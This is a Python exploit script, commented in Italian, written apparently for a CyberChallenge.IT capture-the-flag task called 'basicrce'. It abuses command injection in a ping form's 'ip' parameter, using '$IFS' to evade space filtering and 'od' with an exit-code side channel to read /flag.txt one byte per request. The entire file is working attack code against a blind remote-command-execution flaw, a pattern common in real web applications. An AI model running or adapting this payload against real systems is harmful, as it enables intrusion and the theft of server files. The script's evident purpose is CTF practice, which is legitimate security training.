import requests
import re
import sys

URL = "http://basicrce.challs.cyberchallenge.it/"

print("[*] Avvio estrazione flag tramite Blind RCE (Exit Code)...")
flag = ""

# Cicliamo da 0 a 50 (lunghezza massima stimata della flag)
for i in range(50):
    # Il nostro payload dinamico. Cambiamo il valore di -j ad ogni ciclo
    payload = f"127.0.0.1;exit$IFS$(od$IFS-An$IFS-tu1$IFS-j{i}$IFS-N1</flag.txt)"
    
    # ATTENZIONE: Se il form usa GET, usiamo 'params'. Se usa POST, usiamo 'data'.
    # Ipotizziamo che il parametro si chiami 'ip' (il più comune per un form di ping)
    # Se lo script non trova nulla, prova a cambiare 'ip' con 'target' o usa data=...
    try:
        # Invio la richiesta (GET)
        response = requests.get(URL, params={'ip': payload})
        
        # Cerchiamo il numero dopo "Return code" nell'HTML
        match = re.search(r"Return code\s*(\d+)", response.text)
        
        if match:
            ascii_val = int(match.group(1))
            
            # Se il valore è 0 o non è un carattere stampabile, probabilmente abbiamo finito
            if ascii_val == 0:
                print("\n[*] Raggiunta la fine del file.")
                break
                
            char = chr(ascii_val)
            flag += char
            
            # Stampiamo a schermo in stile "Matrix"
            sys.stdout.write(char)
            sys.stdout.flush()
            
            # Se troviamo la parentesi di chiusura, abbiamo l'intera flag
            if char == '}':
                print("\n\n[*] Estrazione completata con successo!")
                break
        else:
            print(f"\n[-] Errore: 'Return code' non trovato nell'HTML all'offset {i}.")
            print("Forse il parametro non si chiama 'ip' o la richiesta deve essere POST.")
            break

    except Exception as e:
        print(f"\n[-] Errore di connessione: {e}")
        break

print(f"\n[!] FLAG FINALE: {flag}")